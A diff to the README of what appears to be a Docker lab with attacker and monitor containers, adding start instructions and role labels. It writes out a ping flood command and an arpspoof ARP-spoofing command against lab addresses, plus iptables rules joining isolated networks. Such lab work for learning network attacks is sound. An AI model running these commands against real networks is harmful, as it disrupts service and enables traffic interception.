@@ -1,6 +1,11 @@
 
 # Start
 ```
+./run.sh
+```
+Or
+
+```
 sudo docker compose run --build --rm attacker zsh
 sudo docker compose run --build --rm monitor zsh
 sudo iptables -I DOCKER-ISOLATION-STAGE-2 -o br0 -i br1 -j ACCEPT
@@ -8,13 +13,22 @@ sudo iptables -I DOCKER-ISOLATION-STAGE-2 -o br1 -i br0 -j ACCEPT
 ```
 # Attack 
 ## Ping Flooding
+
+Attacker:
 ```
 sudo ping -f -s 65500 172.20.0.3  
 ```
 ## ARP Spoofing
+
+Attacker:
+```
+ping 172.20.0.3
+
+```
+Monitor
 ```
 arpspoof -i eth0 -t 172.20.0.3 172.20.0.2
-WRONG
+
 ```
 # Exit
 ```
